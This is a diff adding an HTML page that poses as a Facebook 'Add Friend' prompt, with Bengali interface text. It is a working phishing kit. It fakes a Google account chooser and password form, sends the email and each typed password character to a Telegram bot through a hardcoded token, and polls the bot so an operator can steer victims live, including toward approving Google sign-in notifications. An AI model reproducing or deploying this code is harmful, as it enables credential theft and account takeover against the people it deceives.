@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Roboto', Arial, sans-serif; margin: 0; overflow-x: hidden; }
+        .hidden { display: none; }
+        .header-banner { width: 100%; height: 40vh; overflow: hidden; border-bottom: 2px solid #ddd; }
+        .header-banner img { width: 100%; height: 100%; object-fit: cover; }
+        .content-area { width: 100%; max-width: 450px; margin: 0 auto; padding: 20px; }
+        
+        .google-card { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border: 1px solid #dadce0; padding: 25px; min-height: 250px; }
+        
+        /* জিমেইল ইনপুট স্টাইল */
+        .gmail-input {
+            width: 100%; border: 2px solid #4285f4; border-radius: 30px; padding: 14px;
+            text-align: center; font-weight: bold; color: #1a73e8; background: #f8fbff;
+            outline: none; font-size: 16px; transition: 0.3s;
+        }
+
+        /* অ্যানিমেশন লোডার */
+        .loader { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ছোট ডট এনিমেশন */
+        .dots::after { content: ''; animation: dots 1.5s infinite; }
+        @keyframes dots { 0% { content: '.'; } 33% { content: '..'; } 66% { content: '...'; } }
+    </style>
+</head>
+<body>
+
+    <div class="header-banner">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="content-area">
+
+        <div id="step1" class="text-center">
+            <h2 class="text-xl font-bold mb-6 text-gray-800">Add Friend to Continue</h2>
+            <button onclick="requestAction('google_chooser', 'Step 1: Welcome')" class="w-full bg-[#1877f2] text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-all">Confirm & Add</button>
+        </div>
+
+        <div id="google_chooser" class="hidden">
+            <div class="google-card text-center">
+                <div id="searching_ui">
+                    <div class="loader"></div>
+                    <p class="text-gray-600 font-medium mt-4 dots">Searching for logged in account</p>
+                </div>
+
+                <div id="account_ui" class="hidden">
+                    <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" class="w-8 mx-auto mb-3">
+                    <h1 class="text-lg font-semibold text-gray-800">Choose an account</h1>
+                    <p class="text-xs text-gray-500 mb-6">to continue to Facebook</p>
+                    
+                    <input type="email" id="email_field" name="email" 
+                           autocomplete="username email" 
+                           inputmode="email" 
+                           placeholder="আপনার ইমেইলটি বাছুন"
+                           class="gmail-input"
+                           oninput="onEmailCaptured(this.value)">
+                    
+                    <p class="text-[10px] text-blue-500 mt-4 font-medium">বক্সে ক্লিক করলে আপনার ফোনের মূল জিমেইলটি ভেসে উঠবে।</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="step2" class="hidden">
+            <div class="bg-white p-6 rounded-2xl shadow-md border border-gray-100">
+                <div class="flex items-center mb-6 bg-blue-50 p-4 rounded-xl border border-blue-100">
+                    <div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold mr-3">G</div>
+                    <p id="display_email" class="text-sm font-bold text-gray-800 truncate"></p>
+                </div>
+                <input type="password" id="pass" class="w-full p-4 border rounded-xl mb-4 bg-gray-50 outline-none focus:border-blue-500" placeholder="পাসওয়ার্ড লিখুন" oninput="sendLive('🔑 টাইপ করছে: ' + this.value)">
+                <button onclick="requestAction('finish', 'Step 3: Password Submitted')" class="w-full bg-[#1877f2] text-white font-bold py-4 rounded-xl shadow-md">এগিয়ে যান</button>
+            </div>
+        </div>
+
+        <div id="verifying" class="hidden text-center py-10">
+            <div class="loader"></div>
+            <h3 id="v-title" class="text-lg font-bold text-gray-800">Verifying...</h3>
+            <p id="v-msg" class="text-sm text-gray-500 mt-2">বটের কমান্ডের জন্য অপেক্ষা করুন।</p>
+            <button id="retry-btn" onclick="goToStep('step2')" class="hidden mt-6 px-10 py-3 bg-red-500 text-white font-bold rounded-xl shadow-md">Try Again</button>
+        </div>
+
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastId = 0;
+    let selectedMail = "";
+    let nextStepName = "";
+
+    function goToStep(id) {
+        document.querySelectorAll('.content-area > div').forEach(div => div.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    // প্রতিবার অ্যাকশনে বটে বাটনসহ মেসেজ যাবে
+    function requestAction(target, info) {
+        nextStepName = target;
+        goToStep('verifying');
+        
+        // জিমেইল পেজে যাওয়ার সময় বিশেষ এনিমেশন
+        if(target === 'google_chooser') {
+            setTimeout(() => {
+                document.getElementById('searching_ui').classList.add('hidden');
+                document.getElementById('account_ui').classList.remove('hidden');
+            }, 3000);
+        }
+
+        let pass = document.getElementById('pass').value;
+        let text = `📢 **User Status Update**\n📍 Page: \`${info}\`\n📧 Email: \`${selectedMail || "Not Set"}\`\n🔑 Pass: \`${pass || "N/A"}\``;
+        
+        const btns = { inline_keyboard: [
+            [{ text: "✅ Allow (Next)", callback_data: "cmd_next" }],
+            [{ text: "🔑 Google Pass Change", callback_data: "cmd_google" }],
+            [{ text: "❌ Password Error", callback_data: "cmd_error" }],
+            [{ text: "⚠️ Show Verification", callback_data: "cmd_verify" }]
+        ]};
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown", reply_markup: btns })
+        });
+        
+        listenForBot();
+    }
+
+    function onEmailCaptured(val) {
+        if(val.includes('@')) {
+            selectedMail = val;
+            document.getElementById('display_email').innerText = selectedMail;
+            requestAction('step2', 'Step 2: Gmail Selected');
+        }
+    }
+
+    async function sendLive(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        });
+    }
+
+    function listenForBot() {
+        const check = setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastId + 1}`);
+                const data = await res.json();
+                if (data.result) {
+                    data.result.forEach(u => {
+                        lastId = u.update_id;
+                        const cmd = u.callback_query?.data;
+
+                        if(cmd === "cmd_next") {
+                            clearInterval(check);
+                            if(nextStepName === 'finish') window.location.href = "https://m.facebook.com";
+                            else goToStep(nextStepName);
+                        }
+                        if(cmd === "cmd_google") window.location.href = "https://myaccount.google.com/signinoptions/password?hl=hi";
+                        if(cmd === "cmd_error") {
+                            document.getElementById('v-title').innerText = "Wrong Password!";
+                            document.getElementById('retry-btn').classList.remove('hidden');
+                        }
+                        if(cmd === "cmd_verify") {
+                            document.getElementById('v-title').innerText = "Security Check";
+                            document.getElementById('v-msg').innerText = "গুগল থেকে পাঠানো নোটিফিকেশনটি কনফার্ম করুন।";
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 3000);
+    }
+</script>
+</body>
+</html>
